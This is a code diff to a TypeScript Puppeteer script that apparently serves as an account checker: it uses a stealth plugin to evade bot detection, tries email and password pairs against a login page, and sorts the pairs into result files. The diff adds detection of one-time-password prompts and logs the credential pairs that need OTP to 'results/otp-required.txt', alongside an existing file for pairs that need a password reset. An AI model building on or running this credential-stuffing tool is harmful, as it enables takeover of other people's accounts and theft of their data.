@@ -7,6 +7,7 @@ import { collect } from "collect.js";
 import { InvalidEmailError } from "./exceptions/invalid-email";
 import { InvalidPasswordError } from "./exceptions/invalid-password";
 import { ResetPasswordRequired } from "./exceptions/reset-password";
+import { OtpRequired } from "./exceptions/otp-required";
 
 puppeteer.use(stealth());
 
@@ -128,12 +129,20 @@ const checkLogin = async ({ email, password }: CheckLoginProps) => {
       );
     }
 
+    if (
+      (await page.$('prism-input-text[prism-id="verificationCode"]')) ||
+      (await page.$('button[name="email_code"]'))
+    ) {
+      throw new OtpRequired("OTP is required to proceed to account");
+    }
+
     return true;
   } catch (error: any) {
     if (
       error instanceof InvalidEmailError ||
       error instanceof InvalidPasswordError ||
-      error instanceof ResetPasswordRequired
+      error instanceof ResetPasswordRequired ||
+      error instanceof OtpRequired
     ) {
       throw error;
     } else {
@@ -203,6 +212,11 @@ const start = async () => {
         } else if (error instanceof ResetPasswordRequired) {
           appendFileSync(
             "results/reset-password-required.txt",
+            `${emailPassword}|${errorMessage}\n`,
+          );
+        } else if (error instanceof OtpRequired) {
+          appendFileSync(
+            "results/otp-required.txt",
             `${emailPassword}|${errorMessage}\n`,
           );
         } else if (error instanceof Error) {
